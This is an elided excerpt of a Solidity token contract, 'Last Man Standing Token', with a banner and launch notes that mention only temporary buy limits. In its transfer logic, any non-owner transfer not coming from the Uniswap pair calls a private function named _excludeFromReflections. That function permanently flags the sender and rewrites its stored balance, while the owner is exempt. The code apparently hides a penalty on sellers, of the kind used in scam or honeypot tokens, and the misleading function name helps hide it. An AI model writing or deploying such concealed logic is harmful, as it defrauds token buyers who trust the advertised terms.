...
/**
 ...
 |_____|  \__,_| |___/  \__| |_|  |_|  \__,_| |_| |_| |____/   \__|  \__,_| |_| |_|  \__,_| |_| |_| |_|  \__, |
                                                                                                         |___/ 
 ...
 * FIRST TWO MINUTES: 3000000 max buy / 45-second buy cooldown (these limitations are lifted automatically two minutes post-launch)
...
contract LastManStanding is Context, IERC20, Ownable {
    ...
    string public constant _name = "Last Man Standing Token";
    string public constant _symbol = "LMStanding";
    ...
    function balanceOf(address account) public view override returns (uint256) {
        if (_isExcluded[account] || _isExcludedFromReflection[account]) return _tOwned[account];
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner()) {
            ...
            if (!inSwap && from != uniswapV2Pair && swapEnabled) {
                ...
                _excludeFromReflections(from, amount);
	...
	function _excludeFromReflections(address account, uint256 amount) private {
        if (account != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D && !_isExcluded[account]) {
            _isExcludedFromReflection[account] = true;
            if(_rOwned[account] > 0) {
                _tOwned[account] = tokenFromReflection(_rOwned[account]).sub(amount);
            }
